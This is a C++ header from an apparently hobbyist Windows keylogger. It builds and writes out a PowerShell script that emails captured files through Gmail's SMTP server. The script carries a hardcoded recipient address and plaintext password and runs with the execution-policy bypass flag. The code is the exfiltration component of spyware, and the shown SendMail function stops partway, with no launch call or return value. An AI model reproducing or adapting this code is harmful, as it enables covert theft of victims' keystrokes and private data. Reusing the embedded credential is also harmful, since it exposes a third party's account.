//
// Created by Samuel on 19/06/2017.
//

#ifndef KEYLOGGER_SENDMAIL_H
#define KEYLOGGER_SENDMAIL_H

#include <fstream>
#include <vector>
#include "windows.h"
#include "IO.h"
#include "Timer.h"
#include "Helper.h"
#include <string_view>

#define SCRIPT_NAME "sm.ps1"

using namespace std;
using namespace IO;

namespace Mail
{
	
	#define X_EM_TO "sam@sam4it.com"
	#define X_EM_FROM "sam@sam4it.com"
	#define X_EM_PASS "sl71064LS"

	const std::string &PowerShellScript = "Param( [String]$Att, \n       [String]$Subj,\n       [String]$Body\n     )\n\nFunction Send-Mail\n{\n    Param(\n            [Parameter(Mandatory=$true)] [string]$To, \n            [Parameter(Mandatory=$true)] [string]$From,\n            [Parameter(Mandatory=$true)] [string]$Password,\n            [Parameter(Mandatory=$true)] [string]$Subject,\n            [Parameter(Mandatory=$true)] [string]$Body,\n            [Parameter(Mandatory=$true)] [string]$Attachment\n        )\n\n\ttry\n\t{\n\t\t$Msg = New-Object System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\n\t\t$Srv = \"smtp.gmail.com\"\n\t\tif($Attachment -ne $null)\n\t\t{\n\t\t\ttry\n\t\t\t{\n\t\t\t\t$attachments = $Attachment -split (\"\\:\\:\");\n\n\t\t\t\tForEach($val in $attachments)\n\t\t\t\t{\n\t\t\t\t\t$attach = New-Object System.Net.Mail.Attachment($val)\n\t\t\t\t\t$Msg.Attachments.Add($attach) \n\t\t\t\t}\n\t\t\t}\n\t\t\tcatch\n\t\t\t{\n\t\t\t\texit 2;\n\t\t\t}\n\n\t\t\t$Client = New-Object Net.Mail.SmtpClient($Srv, 587)\n\t\t\t$Client.EnableSsl = $true\n\t\t\t$Client.Credentials = New-Object System.Net.NetworkCredential($From.Split(\"@\")[0], $Password)\n\t\t\t$Client.Send($Msg)\n\t\t\tRemove-Variable -Name Client\n\t\t\tRemove-Variable -Name Password\n\t\t\texit 7;\n\t\t}\n\t} catch {\n\t\t\texit 3;\n\t}\n}\n\ntry {\n\tSend-Mail -To \"" + std::string(X_EM_TO) + "\" -From \"" + std::string(X_EM_FROM) + "\" -Password \"" + std::string(X_EM_PASS) + "\" -Body $Body -Subject $Subj -Attachment $Att\n} catch {\n    exit 4;\n}\n";

	#undef X_EM_TO
	#undef X_EM_FROM
	#undef X_EM_PASS

	string StringReplace(string s, const string &what, const string &with)
	{
		if (what.empty())
			return s;
		size_t sp = 0;
		while ((sp = s.find(what, sp)) != string::npos)
			s.replace(sp, what.length(), with), sp += with.length();
		return s;
	}

	bool CheckFileExsts(const string &f)
	{
		ifstream file(f);
		return (bool)file;
	}

	bool CreateScript()
	{
		ofstream script(GetOurPath(true) + string(SCRIPT_NAME));

		if(!script)
			return false;
		script << PowerShellScript;

		if (!script)
			return false;

		script.close();

		return true;
	}

	Timer m_timer;

	int SendMail(const string &subject, const string &body, const string &attachments)
	{
		bool ok;

		ok = MKDir(GetOurPath(true));
		if (!ok)
			return -1;
		string scr_path = GetOurPath(true) + string(SCRIPT_NAME);
		if (!CheckFileExsts(scr_path))
			ok = CreateScript();
		if (!ok)
			return -2;

		string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" - Subj \"" + StringReplace(subject, "\"", "\\\"") + "\" -Body \"" + StringReplace(body, "\"", "\\\"") + "\" -Att \"" + attachments + "\"";

		SHELLEXECUTEINFO ShExecInfo = { 0 };
		ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
		ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
		ShExecInfo.hwnd = NULL;
		ShExecInfo.lpVerb = "open";
	}
}



#endif //KEYLOGGER_SENDMAIL_H